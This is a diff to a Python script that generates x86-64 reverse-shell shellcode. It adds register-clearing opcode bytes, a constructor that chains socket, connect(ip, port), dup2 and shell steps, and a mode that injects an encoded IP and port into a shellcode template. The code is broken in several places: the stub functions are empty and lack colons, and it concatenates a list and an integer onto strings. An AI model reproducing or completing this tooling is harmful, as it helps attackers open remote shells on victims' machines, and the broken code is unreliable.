@@ -1,6 +1,47 @@
 import argparse
 import operator
 
+def clean(register):
+    if register == "rax":
+        values = ["\x48\x31\xC0", "\xB0\x01\x48\xFF\xC8"]
+    if register == "rbx":
+        values = ["\x48\x31\xDB", "\xB3\x01\x48\xFF\xCB"]
+    if register == "rcx":
+        values = ["\x48\x31\xC9", "\xB1\x01\x48\xFF\xC9"]
+    if register == "rdx":
+        values = ["\x48\x31\xD2", "\xB2\x01\x48\xFF\xCA"]
+    if register == "rdi":
+        values = ["\x48\x31\xFF", "\xB0\x01\x48\xFF\xC8"]
+    if register == "rsi":
+        values = ["\x48\x31\xF6", "\xB0\x01\x48\xFF\xC8"]
+    
+    return values
+
+def socket()
+def connect()
+def dup2()
+def shell()
+def clean_exit()
+
+def constructor(ip, port):
+    shellcode = ""
+    shellcode += clean("rax")
+    shellcode += clean("rbx")
+    shellcode += clean("rcx")
+    shellcode += clean("rdx")
+    shellcode += clean("rdi")
+    shellcode += clean("rsi")
+    shellcode += socket()
+    shellcode += connect(ip, port)
+    shellcode += dup2()
+    shellcode += shell()
+    shellcode += clean_exit()
+
+    print("Hello your shellcode is "+len(shellcode)/4+" character long !")
+    print(shellcode)
+
+    return shellcode
+
 def ip_treatment(ip):
     """
     Hex conversion, xor and reverse it
@@ -52,16 +93,19 @@ if __name__ == "__main__":
     # and then parse it
     args = parser.parse_args()
 
-    if not args.file:
-        print("You need to set a file to treat")
-        exit(0)
-    else:
+    ip = ip_treatment(args.ip_address)
+    port = port_treatment(args.port)
+
+    if args.file and not args.construct:
         with open(args.file, 'r') as f:
             code = f.read()
 
+        code = code.replace("-ip_address-", ip)
+        code = code.replace("-port-", port)
+        print(code)
 
-    ip = ip_treatment(args.ip_address)
-    port = port_treatment(args.port)
-    code = code.replace("-ip_address-", ip)
-    code = code.replace("-port-", port)
-    print(code)
+    elif not args.file and args.construct:
+        constructor(ip, port)
+    else:
+        print("You need to set a file to treat")
+        exit(0)
